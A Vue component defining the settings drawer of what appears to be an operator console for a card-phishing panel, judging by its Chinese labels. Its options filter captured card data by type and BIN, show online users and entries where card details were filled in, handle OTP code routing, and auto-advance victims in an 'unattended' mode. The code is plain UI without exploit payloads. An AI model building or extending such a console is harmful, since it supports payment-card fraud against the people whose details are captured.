<script setup lang="ts">
import { ref, reactive, watch } from 'vue';

const visible = ref(false);

export interface ConsoleSettings {
  dataReverse: boolean;
  hideBinFields: boolean;
  hidePhoneField: boolean;
  onlyCardData: boolean;
  hideEmptyClients: boolean;
  customOtpTail: string;
  unattendedMode: boolean;
  unattendedSeconds: number;
  allowDuplicateCard: boolean;
  cardTypeFilter: 'off' | 'C' | 'D';
  autoRejectBins: string;
  hideOfflineUsers: boolean;
}

const emit = defineEmits<{
  (e: 'settings-changed', settings: ConsoleSettings): void;
}>();

const settings = reactive<ConsoleSettings>({
  dataReverse: false,
  hideBinFields: false,
  hidePhoneField: false,
  onlyCardData: false,
  hideEmptyClients: false,
  customOtpTail: '',
  unattendedMode: false,
  unattendedSeconds: 3,
  allowDuplicateCard: false,
  cardTypeFilter: 'off',
  autoRejectBins: '',
  hideOfflineUsers: false,
});

const STORAGE_KEY = 'payment_console_settings';

function load() {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (raw) Object.assign(settings, JSON.parse(raw));
  } catch {}
}
function save() {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(settings));
}

load();
watch(settings, () => {
  save();
  emit('settings-changed', { ...settings });
}, { deep: true, immediate: true });

function open() { visible.value = true; }
function close() { visible.value = false; }

defineExpose({ open, close, settings, visible });
</script>

<template>
  <NDrawer :show="visible" :width="360" placement="right" @update:show="(v: boolean) => { if (!v) close(); }">
    <NDrawerContent title="会话面板设置" closable>
      <div class="settings-body">

        <!-- 数据展示 -->
        <div class="section">
          <h4>数据展示</h4>
          <NSpace vertical :size="4">
            <NCheckbox v-model:checked="settings.dataReverse">数据倒序排列</NCheckbox>
            <NCheckbox v-model:checked="settings.hideBinFields">隐藏卡级/卡银行等 BIN 信息</NCheckbox>
            <NCheckbox v-model:checked="settings.hidePhoneField">隐藏电话栏</NCheckbox>
          </NSpace>
        </div>

        <!-- 过滤设置 -->
        <div class="section">
          <h4>过滤设置</h4>
          <NSpace vertical :size="4">
            <NCheckbox v-model:checked="settings.onlyCardData">只显示填卡数据</NCheckbox>
            <NCheckbox v-model:checked="settings.hideEmptyClients">隐藏无数据客户端</NCheckbox>
            <NCheckbox v-model:checked="settings.hideOfflineUsers">隐藏离线用户</NCheckbox>
          </NSpace>
          <div class="field-row">
            <label>OTP 验证码手机尾号</label>
            <NInput v-model:value="settings.customOtpTail" placeholder="输入手机尾号" maxlength="6" size="small" />
          </div>
        </div>

        <!-- 功能设置 -->
        <div class="section">
          <h4>功能设置</h4>
          <NSpace vertical :size="4">
            <NCheckbox v-model:checked="settings.unattendedMode">
              无人值守（{{ settings.unattendedSeconds }}s 后自动跳转完成）
            </NCheckbox>
            <NCheckbox v-model:checked="settings.allowDuplicateCard">允许重复卡号提交</NCheckbox>
          </NSpace>
          <div class="field-row">
            <label>按卡类型筛选</label>
            <NSelect v-model:value="settings.cardTypeFilter" :options="[
              { label: '关闭', value: 'off' },
              { label: '只要 C 卡', value: 'C' },
              { label: '只要 D 卡', value: 'D' },
            ]" size="small" />
          </div>
          <div class="field-row">
            <label>自动拒绝的卡头（6位，逗号分隔）</label>
            <NInput v-model:value="settings.autoRejectBins" placeholder="457362,521300" size="small" />
          </div>
        </div>

      </div>
    </NDrawerContent>
  </NDrawer>
</template>

<style scoped>
.settings-body {
  display: flex;
  flex-direction: column;
  gap: 4px;
}
.section {
  padding: 12px 0;
  border-bottom: 1px solid var(--n-border-color);
}
.section h4 {
  font-size: 13px;
  color: #18d46b;
  margin-bottom: 10px;
}
.field-row {
  margin-top: 10px;
}
.field-row label {
  font-size: 12px;
  color: var(--n-text-color-3);
  margin-bottom: 4px;
  display: block;
}
</style>
